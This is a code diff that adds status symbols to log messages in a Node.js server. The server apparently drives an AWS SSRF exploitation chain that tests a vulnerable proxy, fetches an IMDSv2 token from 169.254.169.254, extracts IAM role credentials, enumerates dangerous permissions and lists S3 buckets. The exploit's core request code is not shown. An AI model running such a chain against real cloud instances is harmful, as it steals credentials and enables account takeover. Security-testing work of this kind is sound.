@@ -87,8 +87,8 @@ app.post('/api/start', async (req, res) => {
       emitLog('info', 'Sending SSRF test request...');
       const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
       if (!isVulnerable) {
-        emitLog('error', 'SSRF test failed - proxy not vulnerable or unreachable');
-        emitLog('warning', 'Possible issues: Proxy server not running, cannot reach 169.254.169.254, or wrong parameter');
+        emitLog('error', '✗ SSRF test failed - proxy not vulnerable or unreachable');
+        emitLog('warning', '⚠ Possible issues: Proxy server not running, cannot reach 169.254.169.254, or wrong parameter');
         emitLog('info', 'Verify proxy can make requests to 169.254.169.254');
         io.emit('exploitationComplete');
         return;
@@ -96,7 +96,7 @@ app.post('/api/start', async (req, res) => {
       emitLog('success', '✓ SSRF vulnerability confirmed');
       emitLog('info', 'Proxy is responding correctly to IMDS requests');
     } catch (error) {
-      emitLog('error', `SSRF test error: ${error.message}`);
+      emitLog('error', `✗ SSRF test error: ${error.message}`);
       emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
       io.emit('exploitationComplete');
       return;
@@ -107,8 +107,8 @@ app.post('/api/start', async (req, res) => {
     emitLog('info', 'Sending PUT request to token endpoint...');
     const token = await imds.fetchIMDSv2Token(proxyUrl);
     if (!token) {
-      emitLog('error', 'Failed to extract IMDSv2 token');
-      emitLog('warning', 'Cannot proceed without valid IMDSv2 token');
+      emitLog('error', '✗ Failed to extract IMDSv2 token');
+      emitLog('warning', '⚠ Cannot proceed without valid IMDSv2 token');
       io.emit('exploitationComplete');
       return;
     }
@@ -123,7 +123,7 @@ app.post('/api/start', async (req, res) => {
     emitLog('info', 'Querying /latest/meta-data/iam/security-credentials endpoint...');
     const roles = await imds.fetchAllIAMRoles(proxyUrl, token);
     if (!roles || roles.length === 0) {
-      emitLog('warning', 'No IAM roles found on instance');
+      emitLog('warning', '⚠ No IAM roles found on instance');
       emitLog('info', 'This instance may not have an IAM instance profile attached');
     } else {
       emitLog('success', `✓ Found ${roles.length} IAM role(s)`);
@@ -182,10 +182,10 @@ app.post('/api/start', async (req, res) => {
             region: validation.region,
           });
         } else {
-          emitLog('warning', 'Credential validation failed');
+          emitLog('warning', '⚠ Credential validation failed');
         }
       } else {
-        emitLog('error', `Failed to extract credentials for ${role}`);
+        emitLog('error', `✗ Failed to extract credentials for ${role}`);
       }
     }
 
@@ -206,7 +206,7 @@ app.post('/api/start', async (req, res) => {
     emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
     emitLog('info', `Permissions by service: ${Object.keys(permResults.permissionsByService).length} services`);
     if (permResults.dangerousPermissionsList && permResults.dangerousPermissionsList.length > 0) {
-      emitLog('warning', `Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
+      emitLog('warning', `⚠ Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
       emitLog('info', `Dangerous permissions: ${permResults.dangerousPermissionsList.join(', ')}`);
     }
     currentSession.summary.setPermissions({
@@ -236,7 +236,7 @@ app.post('/api/start', async (req, res) => {
         emitLog('info', 'No S3 buckets found or no s3:ListAllMyBuckets permission');
       }
     } catch (error) {
-      emitLog('warning', 'S3 access test failed');
+      emitLog('warning', '⚠ S3 access test failed');
       emitLog('info', `Error: ${error.message}`);
     }
 
@@ -244,7 +244,7 @@ app.post('/api/start', async (req, res) => {
     emitLog('info', 'You can now use the action buttons to explore AWS resources.');
     io.emit('exploitationComplete');
   } catch (error) {
-    emitLog('error', `Exploitation failed: ${error.message}`);
+    emitLog('error', `✗ Exploitation failed: ${error.message}`);
     emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
     io.emit('exploitationComplete');
   }
